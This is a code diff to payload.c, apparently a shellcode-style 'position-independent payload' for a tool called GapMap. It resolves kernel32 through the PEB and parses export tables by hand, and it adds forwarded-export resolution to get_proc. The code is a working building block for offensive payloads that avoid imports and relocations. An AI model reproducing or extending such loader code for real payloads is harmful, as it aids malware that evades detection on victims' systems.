@@ -1,5 +1,5 @@
 /*
- * payload.c — Position-independent payload for GapMap.
+ * payload.c - Position-independent payload for GapMap.
  *
  * All strings on the stack. No .rdata, no imports, no relocations.
  * Resolves kernel32 via PEB, finds APIs by export table parsing.
@@ -18,7 +18,7 @@ typedef int            BOOL;
 typedef unsigned short WORD;
 typedef unsigned char  BYTE;
 
-/* PEB/LDR — opaque reserved blocks to the fields we actually read.
+/* PEB/LDR - opaque reserved blocks to the fields we actually read.
  * Avoids faking per-field layouts that only work by luck with padding. */
 
 typedef struct { WORD Length; WORD MaxLen; wchar_t *Buffer; } USTR;
@@ -98,7 +98,8 @@ static void *get_proc(void *base, const char *name)
     if (*(WORD *)b != 0x5A4D) return 0;
 
     int e_lfanew = *(int *)(b + DOS_E_LFANEW);
-    DWORD export_rva = *(DWORD *)(b + e_lfanew + PE_EXPORT_DD_OFF);
+    DWORD export_rva  = *(DWORD *)(b + e_lfanew + PE_EXPORT_DD_OFF);
+    DWORD export_size = *(DWORD *)(b + e_lfanew + PE_EXPORT_DD_OFF + 4);
     if (!export_rva) return 0;
 
     EXPORT_DIR *exp = (EXPORT_DIR *)(b + export_rva);
@@ -106,9 +107,22 @@ static void *get_proc(void *base, const char *name)
     DWORD *names = (DWORD *)(b + exp->AddressOfNames);
     WORD  *ords  = (WORD  *)(b + exp->AddressOfNameOrdinals);
 
-    for (DWORD i = 0; i < exp->NumberOfNames; i++)
-        if (streq((const char *)(b + names[i]), name))
-            return (void *)(b + funcs[ords[i]]);
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        if (!streq((const char *)(b + names[i]), name)) continue;
+        DWORD rva = funcs[ords[i]];
+        if (rva >= export_rva && rva < export_rva + export_size) {
+            const char *fwd = (const char *)(b + rva);
+            char mod[64] = {0};
+            int dot = 0;
+            while (fwd[dot] && fwd[dot] != '.' && dot < 59) { mod[dot] = fwd[dot]; dot++; }
+            mod[dot] = '.'; mod[dot+1] = 'd'; mod[dot+2] = 'l'; mod[dot+3] = 'l'; mod[dot+4] = 0;
+            if (!fwd[dot]) return 0;
+            void *target = find_module(mod);
+            if (!target) return 0;
+            return get_proc(target, fwd + dot + 1);
+        }
+        return (void *)(b + rva);
+    }
     return 0;
 }
 
